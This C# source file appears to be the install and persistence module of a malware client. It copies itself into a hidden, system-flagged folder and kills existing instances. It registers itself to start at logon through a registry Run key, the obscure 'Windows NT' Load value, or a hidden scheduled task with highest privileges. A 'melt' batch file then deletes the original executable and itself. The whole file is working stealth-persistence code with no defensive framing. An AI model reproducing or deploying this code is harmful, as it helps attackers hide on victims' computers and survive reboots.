using celestialC.Helper;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace celestialC.Install
{
    public class Install
    {
        public static bool AddToRunReg(string filename)
        {
            if (Convert.ToBoolean(Settings.AutoRunhidden))
                try
                {
                    using (
                        var registryKey =
                            Registry.CurrentUser.OpenSubKey(
                                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
                                true))
                            registryKey.SetValue("Load", filename, RegistryValueKind.String); //NO QUOTATION!!!
                            return true;
                }
                catch { }
            else
                try
                {
                    using (
                           var registryKey =
                               Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true)
                           )
                    {
                        if (registryKey != null)
                        {
                            var existingKeys = new List<string>();
                            var path = $"\"{filename}\"";
                            foreach (var key in registryKey.GetValueNames())
                            {
                                var str = registryKey.GetValue(key) as string;
                                if (str != null && string.Equals(path, str, StringComparison.OrdinalIgnoreCase) &&
                                    !string.Equals(key, Settings.RegistryKeyName, StringComparison.OrdinalIgnoreCase))
                                    existingKeys.Add(key);
                            }
                            registryKey.SetValue(Settings.RegistryKeyName, path, RegistryValueKind.String);
                            foreach (var existingKey in existingKeys)
                                registryKey.DeleteValue(existingKey);
                            return true;
                        }
                        else
                            return false;
                    }
                }
                catch { }
            return false;
        }

        public static bool AddToRunSch(string filename)
        {
            if (Methods.IsAdmin())
            {
                if (Convert.ToBoolean(Settings.AutoRunHighest))
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Settings.NameInTasks + "\"" + " /tr " + "'" + "\"" + filename + "\"" + "' & exit",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                    });
                else
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/c schtasks /create /f /sc onlogon /tn " + "\"" + Settings.NameInTasks + "\"" + " /tr " + "'" + "\"" + filename + "\"" + "' & exit",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                    });
                return true;
            }
            else
                return false;
        }

        public static void AddtoRun(string filename)
        {
            if (!Convert.ToBoolean(Settings.TryAnotherIfFails))
                switch (Settings.AutoRunMethod)
                {
                    case "first":
                        AddToRunReg(filename);
                        break;
                    case "secound":
                        AddToRunSch(filename);
                        break;
                }
            else
                switch (Settings.AutoRunMethod)
                {
                    case "first":
                        if (!AddToRunReg(filename))
                            AddToRunSch(filename);
                        break;
                    case "secound":
                        if (!AddToRunSch(filename))
                            AddToRunReg(filename);
                        break;
                }
        }


        public static void BInstall()
        {
            try
            {
                string installpath = Environment.ExpandEnvironmentVariables(Settings.InstallFolder) + "\\" + Settings.InstallSubFolder  + "\\"+ Settings.InstallName;
                string currentProcess = Process.GetCurrentProcess().MainModule.FileName;
                if (installpath == currentProcess) return;
                if (currentProcess != installpath)
                {
                    foreach (Process P in Process.GetProcesses())
                    {
                        try
                        {
                            if (P.MainModule.FileName == installpath)
                                P.Kill();
                        }
                        catch { }
                    }

                    if (!Directory.Exists(Environment.ExpandEnvironmentVariables(Settings.InstallFolder) + "\\" +  Settings.InstallSubFolder))
                    {
                        Directory.CreateDirectory(Environment.ExpandEnvironmentVariables(Settings.InstallFolder) + "\\" +  Settings.InstallSubFolder);
                    }
                    var di = new DirectoryInfo(Environment.ExpandEnvironmentVariables(Settings.InstallFolder) + "\\" +  Settings.InstallSubFolder);
                    if (Convert.ToBoolean(Settings.HideEverything) && Convert.ToBoolean(Settings.HideEverythingSys))
                    {
                        di.Attributes |= FileAttributes.Hidden | FileAttributes.System;
                    }
                    else if (Convert.ToBoolean(Settings.HideEverything) && !Convert.ToBoolean(Settings.HideEverythingSys))
                        di.Attributes |= FileAttributes.Hidden;
                    else if (!Convert.ToBoolean(Settings.HideEverything) && Convert.ToBoolean(Settings.HideEverythingSys))
                        di.Attributes |= FileAttributes.System;
                    FileStream fis;
                    if (File.Exists(installpath))
                    {
                        File.Delete(installpath);
                        Thread.Sleep(100);
                    }
                    fis = new FileStream(installpath, FileMode.CreateNew);
                    byte[] clientExe = File.ReadAllBytes(currentProcess);
                    fis.Write(clientExe, 0, clientExe.Length);
                    fis.Close();

                    if (Convert.ToBoolean(Settings.HideEverything) && Convert.ToBoolean(Settings.HideEverythingSys))
                    {
                        File.SetAttributes(installpath, FileAttributes.Hidden | FileAttributes.System);
                    }
                    else if (Convert.ToBoolean(Settings.HideEverything) && !Convert.ToBoolean(Settings.HideEverythingSys))
                        File.SetAttributes(installpath, FileAttributes.Hidden);
                    else if (!Convert.ToBoolean(Settings.HideEverything) && Convert.ToBoolean(Settings.HideEverythingSys))
                        File.SetAttributes(installpath, FileAttributes.System);
                    if (Settings.AutoRunMethod != "none")
                        AddtoRun(installpath);

                    Methods.ClientOnExit();

                    if (Convert.ToBoolean(Settings.InstallMelt))
                    {
                        string batch = Path.GetTempFileName() + ".bat";
                        using (StreamWriter sw = new StreamWriter(batch))
                        {
                            sw.WriteLine("@echo off");
                            sw.WriteLine("chcp 65001");
                            sw.WriteLine("timeout 2 > NUL");
                            sw.WriteLine("DEL " + "\"" + currentProcess + "\"" + " /f /q");
                            sw.WriteLine("CD " + Path.GetTempPath());
                            sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                        }

                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = batch,
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                    }

                    Process.Start(installpath);

                    Environment.Exit(0);
                }
            }
            catch { }
        }
    }
}
